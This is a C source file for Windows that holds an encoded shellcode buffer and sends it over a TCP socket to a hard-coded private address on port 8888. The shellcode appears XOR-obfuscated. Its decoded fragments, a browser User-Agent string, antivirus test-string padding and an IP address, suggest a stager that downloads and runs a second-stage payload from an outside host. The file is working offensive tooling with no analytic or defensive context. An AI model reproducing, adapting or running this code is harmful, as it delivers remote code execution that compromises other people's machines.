#include <WinSock2.h>
#include <Windows.h>
#include <stdio.h>
#include <intrin.h>

#pragma comment(lib,"ws2_32.lib")
char buf[] = "\xf6\xe2\x83\x0a\x0a\x0a\x6a\x83\xef\x3b\xd8\x6e\x81\x58\x3a\x81\x58\x06\x81\x58\x1e\x81\x78\x22\x05\xbd\x40\x2c\x3b\xf5\x3b\xca\xa6\x36\x6b\x76\x08\x26\x2a\xcb\xc5\x07\x0b\xcd\xe8\xfa\x58\x5d\x81\x58\x1a\x81\x48\x36\x0b\xda\x81\x4a\x72\x8f\xca\x7e\x40\x0b\xda\x5a\x81\x42\x12\x81\x52\x2a\x0b\xd9\xe9\x36\x43\x81\x3e\x81\x0b\xdc\x3b\xf5\x3b\xca\xa6\xcb\xc5\x07\x0b\xcd\x32\xea\x7f\xfe\x09\x77\xf2\x31\x77\x2e\x7f\xe8\x52\x81\x52\x2e\x0b\xd9\x6c\x81\x06\x41\x81\x52\x16\x0b\xd9\x81\x0e\x81\x0b\xda\x83\x4e\x2e\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x52\x55\x50\x81\x18\xe1\x8c\x57\x62\x64\x6f\x7e\x0a\x62\x7d\x63\x64\x63\x5e\x62\x46\x7d\x2c\x0d\xf5\xdf\x3b\xf5\x5d\x5d\x5d\x5d\x5d\x62\x30\x5c\x73\xad\xf5\xdf\xe3\x8e\x0a\x0a\x0a\x51\x3b\xc3\x5b\x5b\x60\x09\x5b\x5b\x62\x9a\x15\x0a\x0a\x59\x5a\x62\x5d\x83\x95\xcc\xf5\xdf\xe1\x7a\x51\x3b\xd8\x58\x62\x0a\x08\x6a\x8e\x58\x58\x58\x59\x58\x5a\x62\xe1\x5f\x24\x31\xf5\xdf\x83\xcc\x89\xc9\x5a\x3b\xf5\x5d\x5d\x60\xf5\x59\x5c\x62\x27\x0c\x12\x71\xf5\xdf\x8f\xca\x05\x8e\xc9\x0b\x0a\x0a\x3b\xf5\x8f\xfc\x7e\x0e\x83\xf3\xe1\x03\x62\xa0\xcf\xe8\x57\xf5\xdf\x83\xcb\x62\x4f\x2b\x54\x3b\xf5\xdf\x3b\xf5\x5d\x60\x0d\x5b\x5c\x5a\x62\xbd\x5d\xea\x01\xf5\xdf\xb5\x0a\x25\x0a\x0a\x33\xcd\x7e\xbd\x3b\xf5\xe3\x9b\x0b\x0a\x0a\xe3\xc3\x0b\x0a\x0a\xe2\x81\xf5\xf5\xf5\x25\x39\x7f\x65\x4f\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x0a\x5f\x79\x6f\x78\x27\x4b\x6d\x6f\x64\x7e\x30\x2a\x47\x65\x70\x63\x66\x66\x6b\x25\x3f\x24\x3a\x2a\x22\x69\x65\x67\x7a\x6b\x7e\x63\x68\x66\x6f\x31\x2a\x47\x59\x43\x4f\x2a\x33\x24\x3a\x31\x2a\x5d\x63\x64\x6e\x65\x7d\x79\x2a\x44\x5e\x2a\x3c\x24\x3b\x31\x2a\x5e\x78\x63\x6e\x6f\x64\x7e\x25\x3f\x24\x3a\x31\x2a\x48\x45\x43\x4f\x33\x31\x44\x46\x44\x46\x23\x07\x00\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x0a\x62\xfa\xbf\xa8\x5c\xf5\xdf\x60\x4a\x62\x0a\x1a\x0a\x0a\x62\x0a\x0a\x4a\x0a\x5d\x62\x52\xae\x59\xef\xf5\xdf\x99\xb3\x0a\x0a\x0a\x0a\x0b\xd3\x5b\x59\x83\xed\x5d\x62\x0a\x2a\x0a\x0a\x59\x5c\x62\x18\x9c\x83\xe8\xf5\xdf\x8f\xca\x7e\xcc\x81\x0d\x0b\xc9\x8f\xca\x7f\xef\x52\xc9\xe2\xa3\xf7\xf5\xf5\x3b\x33\x38\x24\x3b\x3c\x32\x24\x3b\x3d\x3a\x24\x3b\x38\x32\x0a\x0a\x0a\x0a\x0a";

int wmain(int argc, TCHAR argv[]){
	DWORD dwError;
	WORD sockVersion = MAKEWORD(2, 2);
	WSADATA wsaData;
	SOCKET socks;
	SHORT sListenPort = 8888;
	struct sockaddr_in sin;

	if (WSAStartup(sockVersion, &wsaData) != 0)
	{
		dwError = GetLastError();
		printf("[*]WSAStarup Error : %d \n",dwError);
		return dwError;
	}
	
	socks = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	if (socks == INVALID_SOCKET)
	{
		dwError = GetLastError();
		printf("[*]Socket Error : %d \n",dwError);
		return dwError;
	}

	sin.sin_family = AF_INET;
	sin.sin_port = htons(sListenPort);
	sin.sin_addr.S_un.S_addr = inet_addr("192.168.170.1");

	if(connect(socks,(struct sockaddr *)&sin,sizeof(sin)) == SOCKET_ERROR )
	{
		dwError = GetLastError();
		printf("[*]Bind Error : %d \n",dwError);
		return dwError;
	}
	int ret = send(socks,buf,sizeof(buf),0);

	if (ret > 0)
	{
		printf("[+]Send %d-Bytes \n",ret);
		closesocket(socks);
	}

	WSACleanup();
	return 0;
}